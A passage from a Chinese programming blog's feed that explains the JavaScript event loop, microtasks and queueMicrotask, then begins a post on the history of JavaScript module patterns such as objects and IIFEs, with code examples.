title="事件循环（Event loops）"></a>事件循环（Event loops）</h3><p>每个代理都是由<strong>事件循环</strong>驱动的，事件循环负责收集事件（包括用户事件以及其他非用户事件等）、对任务进行排队以便在合适的时候执行回调。然后它执行所有处于等待中的 JavaScript 任务（宏任务），然后是微任务，然后在开始下一次循环之前执行一些必要的渲染和绘制操作。</p><p>网页或者 app 的代码和浏览器本身的用户界面程序运行在相同的<strong>线程</strong>中， 共享相同的 <strong>事件循环</strong>。 该线程就是<strong>主线程</strong>，它除了运行网页本身的代码之外，还负责收集和派发用户和其它事件，以及渲染和绘制网页内容等。</p><p>然后，事件循环会驱动发生在浏览器中与用户交互有关的一切，但在这里，对我们来说更重要的是需要了解它是如何负责调度和执行在其线程中执行的每段代码的。</p><p>有如下三种事件循环:</p><ul><li><p>Window 事件循环</p><p>window 事件循环驱动所有同源的窗口。</p></li><li><p>Worker 事件循环</p><p>worker 事件循环顾名思义就是驱动 worker 的事件循环。这包括了所有种类的 worker：最基本的 web worker以及 shared worker 和 service worker。 Worker 被放在一个或多个独立于 “主代码” 的代理中。浏览器可能会用单个或多个事件循环来处理给定类型的所有 worker。</p></li><li><p>Worklet 事件循环</p><p>worklet事件循环用于驱动运行 worklet 的代理。这包含了 <code>Worklet</code> 、<code>AudioWorklet</code> 以及 <code>PaintWorklet</code>。</p></li></ul><p>多个同源（译者注：此处同源的源应该不是指同源策略中的源，而是指由同一个窗口打开的多个子窗口或同一个窗口中的多个 iframe 等，意味着起源的意思，下一段内容就会对这里进行说明）窗口可能运行在相同的事件循环中，每个队列任务进入到事件循环中以便处理器能够轮流对它们进行处理。记住这里的网络术语 “window” 实际上指的用于运行网页内容的浏览器级容器，包括实际的 window，一个 tab 标签或者一个 frame。</p><p>在特定情况下，同源窗口之间共享事件循环，例如：</p><ul><li>如果一个窗口打开了另一个窗口，它们可能会共享一个事件循环。</li><li>如果窗口是包含在 <code>&lt;iframe&gt;</code>中，则它可能会和包含它的窗口共享一个事件循环。</li><li>在多进程浏览器中多个窗口碰巧共享了同一个进程。</li></ul><p>这种特定情况依赖于浏览器的具体实现，各个浏览器可能并不一样。</p><h4 id="任务-vs-微任务"><a href="#任务-vs-微任务" class="headerlink" title="任务 vs 微任务"></a>任务 vs 微任务</h4><p>一个<strong>任务</strong>就是指计划由标准机制来执行的任何 JavaScript，如程序的初始化、事件触发的回调等。 除了使用事件，你还可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout"><code>setTimeout()</code></a> 或者 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setInterval"><code>setInterval()</code></a> 来添加任务。</p><p>任务队列和微任务队列的区别很简单，但却很重要：</p><ul><li>当执行来自任务队列中的任务时，在每一次新的事件循环开始迭代的时候运行时都会执行队列中的每个任务。在每次迭代开始之后加入到队列中的任务需要<strong>在下一次迭代开始之后才会被执行</strong>.</li><li><strong>每次当一个任务退出且执行上下文为空的时候，微任务队列中的每一个微任务会依次被执行。</strong>不同的是它会等到微任务队列为空才会停止执行——即使中途有微任务加入。换句话说，<strong>微任务可以添加新的微任务到队列中，并在下一个任务开始执行之前且当前事件循环结束之前执行完所有的微任务。</strong></li></ul><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>由于你的代码和浏览器的用户界面运行在同一个线程中，共享同一个事件循环，假如你的代码阻塞了或者进入了无限循环，则浏览器将会卡死。无论是由于 bug 引起还是代码中进行复杂的运算导致的性能降低，都会降低用户的体验。</p><p>当来自多个程序的多个代码对象尝试同时运行的时候，一切都可能变得很慢甚至被阻塞，更不要说浏览器还需要时间来渲染和绘制网站和 UI、处理用户事件等。</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>使用 <code>web workers</code>可以让主线程另起新的线程来运行脚本，这能够缓解上面的情况。一个设计良好的网站或应用会把一些复杂的或者耗时的操作交给 worker 去做，这样可以让主线程除了更新、布局和渲染网页之外，尽可能少的去做其他事情。</p><p>通过使用像 <code>promises</code>这样的<code>异步JavaScript技术</code>可以<strong>使得主线程在等待请求返回结果的同时继续往下执行，这能够更进一步减轻上面提到的情况。</strong>然而，一些更接近于基础功能的代码——比如一些框架代码，可能更需要将代码安排在主线程上一个安全的时间来运行，它与任何请求的结果或者任务无关。</p><p><strong>微任务</strong>是另一种解决该问题的方案，<strong>通过将代码安排在下一次事件循环开始之前运行而不是必须要等到下一次开始之后才执行，这样可以提供一个更好的访问级别。</strong></p><p>微任务队列已经存在有一段时间了，但之前它仅仅被内部使用来驱动诸如 promise 这些。<code>queueMicrotask()</code>的加入可以让开发者创建一个统一的微任务队列，<strong>它能够在任何时候即便是当 JavaScript 执行上下文栈中没有执行上下文剩余时也可以将代码安排在一个安全的时间运行。</strong> 在多个实例、所有浏览器以及运行时中，一个标准的微任务队列机制意味着这些微任务可以非常可靠的以相同的顺序执行，从而避免一些潜在的难以发现的错误。</p><h2 id="queueMicrotask"><a href="#queueMicrotask" class="headerlink" title="queueMicrotask"></a>queueMicrotask</h2><p>可以安全的引入微任务而避免使用额外的技巧。</p><p>通过引入 <code>queueMicrotask()</code>，由晦涩地使用 promise 去创建微任务而带来的风险就可以被避免了。举例来说，当使用 promise 创建微任务时，由回调抛出的异常被报告为 rejected promises 而不是标准异常。同时，创建和销毁 promise 带来了事件和内存方面的额外开销，这是正确入列微任务的函数应该避免的。</p><p>简单的传入一个 JavaScript <code>Function</code> ，以在 <code>queueMicrotask()</code> 方法中处理微任务时供其上下文调用即可；取决于当前执行上下文， <code>queueMicrotask()</code> 以定义的形式被暴露在 <code>Window</code>或 <code>Worker</code>接口上。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">/* 微任务中将运行的代码 */</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>微任务函数本身没有参数，也不返回值。</p><h3 id="何时使用微任务"><a href="#何时使用微任务" class="headerlink" title="何时使用微任务"></a>何时使用微任务</h3><p>我们来看看微任务特别有用的场景。通常，这些场景关乎捕捉或检查结果、执行清理等；其时机晚于一段 JavaScript 执行上下文主体的退出，但早于任何事件处理函数、timeouts 或 intervals 及其他回调被执行。</p><p>何时是那种有用的时候？</p><p>使用微任务的最主要原因简单归纳为：<strong>确保任务顺序的一致性，即便当结果或数据是同步可用的，也要同时减少操作中用户可感知到的延迟而带来的风险。</strong></p><h4 id="保证条件性使用-promises-时的顺序"><a href="#保证条件性使用-promises-时的顺序" class="headerlink" title="保证条件性使用 promises 时的顺序"></a>保证条件性使用 promises 时的顺序</h4><p>微任务可被用来确保执行顺序总是一致的一种情形，是当 promise 被用在一个 <code>if...else</code> 语句（或其他条件性语句）中、但并不在其他子句中的时候。考虑如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">customElement.prototype.getData = <span class="function"><span class="params">url</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.cache[url]) &#123;</span><br><span class="line">    <span class="built_in">this</span>.data = <span class="built_in">this</span>.cache[url];</span><br><span class="line">    <span class="built_in">this</span>.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">&quot;load&quot;</span>));</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fetch(url).then(<span class="function"><span class="params">result</span> =&gt;</span> result.arrayBuffer()).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.cache[url] = data;</span><br><span class="line">      <span class="built_in">this</span>.data = data;</span><br><span class="line">      <span class="built_in">this</span>.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    )&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这段代码带来的问题是，通过在 <code>if...else</code> 语句的其中一个分支（此例中为缓存中的图片地址可用时）中使用一个任务而 promise 包含在 <code>else</code> 子句中，我们面临了操作顺序可能不同的局势；比方说，像下面看起来的这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element.addEventListener(<span class="string">&quot;load&quot;</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&quot;Loaded data&quot;</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Fetching data...&quot;</span>);</span><br><span class="line">element.getData();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Data fetched&quot;</span>);</span><br></pre></td></tr></table></figure><p>连续执行两次这段代码会形成下表中的结果：</p><table><thead><tr><th align="left">数据未缓存</th><th align="left">数据已缓存</th></tr></thead><tbody><tr><td align="left"><code>Fetching data Data fetched Loaded data </code></td><td align="left"><code>Fetching data Loaded data Data fetched </code></td></tr></tbody></table><p>甚至更糟的是，有时元素的 <code>data</code>属性会被设置，还有时当这段代码结束运行时却不会被设置。</p><p>我们可以通过在 <code>if</code> 子句里使用一个微任务来确保操作顺序的一致性，以达到平衡两个子句的目的：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">customElement.prototype.getData = <span class="function"><span class="params">url</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.cache[url]) &#123;</span><br><span class="line">    queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.data = <span class="built_in">this</span>.cache[url];</span><br><span class="line">      <span class="built_in">this</span>.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fetch(url).then(<span class="function"><span class="params">result</span> =&gt;</span> result.arrayBuffer()).then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">this</span>.cache[url] = data;</span><br><span class="line">      <span class="built_in">this</span>.data = data;</span><br><span class="line">      <span class="built_in">this</span>.dispatchEvent(<span class="keyword">new</span> Event(<span class="string">&quot;load&quot;</span>));</span><br><span class="line">    )&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过在两种情况下各自都通过一个微任务（<code>if</code> 中用的是 <code>queueMicrotask()</code> 而 <code>else</code> 子句中通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch"><code>fetch()</code></a> 使用了 promise）处理了设置 <code>data</code> 和触发 <code>load</code> 事件，平衡了两个子句。</p><h4 id="批量操作"><a href="#批量操作" class="headerlink" title="批量操作"></a>批量操作</h4><p>也可以使用微任务从不同来源将多个请求收集到单一的批处理中，从而避免对处理同类工作的多次调用可能造成的开销。</p><p>下面的代码片段创建了一个函数，将多个消息放入一个数组中批处理，通过一个微任务在上下文退出时将这些消息作为单一的对象发送出去。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> messageQueue = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sendMessage = <span class="function"><span class="params">message</span> =&gt;</span> &#123;</span><br><span class="line">  messageQueue.push(message);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (messageQueue.length === <span class="number">1</span>) &#123;</span><br><span class="line">    queueMicrotask(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> json = <span class="built_in">JSON</span>.stringify(messageQueue);</span><br><span class="line">      messageQueue.length = <span class="number">0</span>;</span><br><span class="line">      fetch(<span class="string">&quot;url-of-receiver&quot;</span>, json);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>当 <code>sendMessage()</code>被调用时，指定的消息首先被推入消息队列数组。接着事情就变得有趣了。</p><p>如果我们刚加入数组的消息是第一条，就入列一个将会发送一个批处理的微任务。照旧，当 JavaScript 执行路径到达顶层，恰在运行回调之前，那个微任务将会执行。这意味着之后的间歇期内造成的对 <code>sendMessage()</code> 的任何调用都会将其各自的消息推入消息队列，但囿于入列微任务逻辑之前的数组长度检查，不会有新的微任务入列。</p><p>当微任务运行之时，等待它处理的可能是一个有若干条消息的数组。微任务函数先是通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify"><code>JSON.stringify()</code></a> 方法将消息数组编码为 JSON。其后，数组中的内容就不再需要了，所以清空 <code>messageQueue</code> 数组。最后，使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch"><code>fetch()</code></a> 方法将编码后的 JSON 发往服务器。</p><p>这使得同一次事件循环迭代期间发生的每次 <code>sendMessage()</code> 调用将其消息添加到同一个 <code>fetch()</code> 操作中，而不会让诸如 timeouts 等其他可能的定时任务推迟传递。</p><p>服务器将接到 JSON 字符串，然后大概会将其解码并处理其从结果数组中找到的消息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;异步&quot;&gt;&lt;a href=&quot;#异步&quot; class=&quot;headerlink&quot; title=&quot;异步&quot;&gt;&lt;/a&gt;异步&lt;/h1&gt;&lt;p&gt;通常来说，程序都是顺序执行，同一时刻只会发生一件事。如果一个函数依赖于另一个函数的结果，它只能等待那个函数结束才能继续执行，从用户的角度来说</summary>
      
    
    
    
    <category term="JS" scheme="https://lesliewaong.top/categories/JS/"/>
    
    
    <category term="Promise" scheme="https://lesliewaong.top/tags/Promise/"/>
    
    <category term="async" scheme="https://lesliewaong.top/tags/async/"/>
    
    <category term="await" scheme="https://lesliewaong.top/tags/await/"/>
    
    <category term="setTimeout" scheme="https://lesliewaong.top/tags/setTimeout/"/>
    
    <category term="回调函数" scheme="https://lesliewaong.top/tags/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>ES6模块化</title>
    <link href="https://lesliewaong.top/posts/e807d0a7.html"/>
    <id>https://lesliewaong.top/posts/e807d0a7.html</id>
    <published>2022-02-27T04:10:12.000Z</published>
    <updated>2022-03-25T14:08:26.412Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模块化的背景"><a href="#模块化的背景" class="headerlink" title="模块化的背景"></a>模块化的背景</h1><p>JavaScript 程序本来很小——在早期，它们大多被用来执行独立的脚本任务，在你的 web 页面需要的地方提供一定交互，所以一般不需要多大的脚本。过了几年，我们现在有了运行大量 JavaScript 脚本的复杂程序，还有一些被用在其他环境（例如 <code>Node.js</code>）。</p><p>因此，近年来，有必要开始考虑提供一种将 JavaScript 程序拆分为可按需导入的单独模块的机制。Node.js 已经提供这个能力很长时间了，还有很多的 JavaScript 库和框架 已经开始了模块的使用（例如， <a href="https://en.wikipedia.org/wiki/CommonJS">CommonJS</a> 和基于 <a href="https://github.com/amdjs/amdjs-api/blob/master/AMD.md">AMD</a> 的其他模块系统 如 <a href="https://requirejs.org/">RequireJS</a>, 以及最新的 <a href="https://webpack.github.io/">Webpack</a> 和 <a href="https://babeljs.io/">Babel</a>）。</p><p>好消息是，<strong>最新的浏览器开始原生支持模块功能了</strong>，这是本文要重点讲述的。这会是一个好事情 — 浏览器能够最优化加载模块，使它比使用库更有效率：使用库通常需要做额外的客户端处理。</p><h1 id="早期模块化"><a href="#早期模块化" class="headerlink" title="早期模块化"></a>早期模块化</h1><h2 id="模块化发展"><a href="#模块化发展" class="headerlink" title="模块化发展"></a>模块化发展</h2><h3 id="原始写法"><a href="#原始写法" class="headerlink" title="原始写法"></a>原始写法</h3><p>模块就是实现特定功能的一组方法。</p><p>只要把不同的函数（以及记录状态的变量）简单地放在一起，就算是一个模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">m1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">m2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的函数m1()和m2()，组成一个模块。使用的时候，直接调用就行了。</p><p>这种做法的缺点很明显：**”污染”了全局变量，无法保证不与其他模块发生变量名冲突，而且模块成员之间看不出直接关系。**</p><h3 id="对象写法"><a href="#对象写法" class="headerlink" title="对象写法"></a>对象写法</h3><p>为了解决上面的缺点，可以<strong>把模块写成一个对象</strong>，所有的模块成员都放到这个对象里面。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = <span class="keyword">new</span> <span class="built_in">Object</span>(&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">_count</span> : <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">    <span class="attr">m1</span> : <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">m2</span> : <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的函数m1()和m2(），都封装在module1对象里。使用的时候，就是调用这个对象的属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module1.m1();</span><br></pre></td></tr></table></figure><p>但是，这样的写法<strong>会暴露所有模块成员，内部状态可以被外部改写</strong>。比如，外部代码可以直接改变内部计数器的值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module1._count = <span class="number">5</span>;</span><br></pre></td></tr></table></figure><h3 id="立即执行函数写法"><a href="#立即执行函数写法" class="headerlink" title="立即执行函数写法"></a>立即执行函数写法</h3><p>使用**”立即执行函数”（Immediately-Invoked Function Expression，IIFE）<strong>，可以达到</strong>不暴露私有成员的目的**。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> _count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> m2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">m1</span> : m1,</span><br><span class="line">        <span class="attr">m2</span> : m2</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>使用上面的写法，外部代码无法读取内部的_count变量。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(module1._count); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>module1就是Javascript模块的基本写法。下面，再对这种写法进行加工。</p><p>将数据和行为封装到一个函数内部, 通过<strong>给window添加属性来向外暴露接口</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.html文件</span></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;module.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    myModule.foo()</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    myModule.bar()</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(myModule.data) <span class="comment">//undefined 不能访问模块内部数据</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    myModule.data = <span class="string">&#x27;xxxx&#x27;</span> <span class="comment">//不是修改的模块内部的data</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    myModule.foo() <span class="comment">//没有改变</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// module.js文件</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = <span class="string">&#x27;www.baidu.com&#x27;</span></span><br><span class="line">  <span class="comment">//操作数据的函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//用于暴露的函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`foo() <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//用于暴露的函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`bar() <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    otherFun() <span class="comment">//内部调用</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">otherFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//内部私有的函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;otherFun()&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//暴露行为</span></span><br><span class="line">  <span class="built_in">window</span>.myModule = &#123; foo, bar &#125; <span class="comment">//ES6写法</span></span><br><span class="line">&#125;)(<span class="built_in">window</span>)</span><br></pre></td></tr></table></figure><h3 id="IIFE模式增强-引入依赖"><a href="#IIFE模式增强-引入依赖" class="headerlink" title="IIFE模式增强 : 引入依赖"></a>IIFE模式增强 : 引入依赖</h3><p>这就是现代模块实现的基石</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module.js文件</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, $</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> data = <span class="string">&#x27;www.baidu.com&#x27;</span></span><br><span class="line">  <span class="comment">//操作数据的函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//用于暴露有函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`foo() <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    $(<span class="string">&#x27;body&#x27;</span>).css(<span class="string">&#x27;background&#x27;</span>, <span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//用于暴露有函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`bar() <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    otherFun() <span class="comment">//内部调用</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">otherFun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//内部私有的函数</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;otherFun()&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//暴露行为</span></span><br><span class="line">  <span class="built_in">window</span>.myModule = &#123; foo, bar &#125;</span><br><span class="line">&#125;)(<span class="built_in">window</span>, jQuery)</span><br><span class="line"></span><br><span class="line"> <span class="comment">// index.html文件</span></span><br><span class="line">  &lt;!-- 引入的js必须有一定顺序 --&gt;</span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-1.10.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;module.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">    myModule.foo()</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>上例子通过jquery方法将页面的背景颜色改成红色，所以必须先引入jQuery库，就把这个库当作参数传入。<strong>这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显</strong>。</p><h2 id="模块化的好处"><a href="#模块化的好处" class="headerlink" title="模块化的好处"></a>模块化的好处</h2><ul><li>避免命名冲突(减少命名空间污染)</li><li>更好的分离, 按需加载</li><li>更高复用性</li><li>高可维护性</li></ul><h2 id="引入多个-lt-script-gt-后出现出现问题"><a href="#引入多个-lt-script-gt-后出现出现问题" class="headerlink" title="引入多个&lt;script&gt;后出现出现问题"></a>引入多个<code>&lt;script&gt;</code>后出现出现问题</h2><ul><li>请求过多</li></ul><p>首先我们要依赖多个模块，那样就会发送多个请求，导致请求过多</p><ul><li>依赖模糊</li></ul><p>我们不知道他们的具体依赖关系是什么，也就是说很容易因为不了解他们之间的依赖关系导致加载先后顺序出错。</p><ul><li>难以维护</li></ul><p>以上两种原因就导致了很难维护，很可能出现牵一发而动全身的情况导致项目出现严重的问题。 